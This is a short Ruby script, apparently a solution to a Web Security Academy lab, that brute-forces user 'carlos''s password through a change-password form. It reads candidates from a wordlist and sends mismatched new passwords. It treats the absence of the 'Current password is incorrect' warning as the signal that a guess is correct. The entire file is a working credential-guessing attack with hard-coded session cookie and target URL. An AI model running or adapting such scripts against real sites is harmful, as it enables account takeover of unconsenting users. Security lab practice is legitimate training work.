require 'http'
require 'nokogiri'

url = 'https://0a29008d03dbba73824b06f9009e00b2.web-security-academy.net/my-account/change-password'
client = HTTP.cookies(
		:session=>"cf5NqVuZNZku6vQfP3iNKQwMNAJ7aNvs"
)

fh = File.new "passwd.txt","r"
passwd = fh.readlines
fh.close

passwd.count.times do |p|
	req = client.post(url,:form=>{
		:username=>"carlos",
		:"current-password"=>"#{passwd[p].chomp}",
		:"new-password-1"=>"tess",
		:"new-password-2"=>"test"
})
	resph = Nokogiri.parse req.body.to_s
	if !resph.search(:css,"p.is-warning").text.eql?("Current password is incorrect")
		puts "Password is #{passwd[p].chomp}"
		break
	end
end
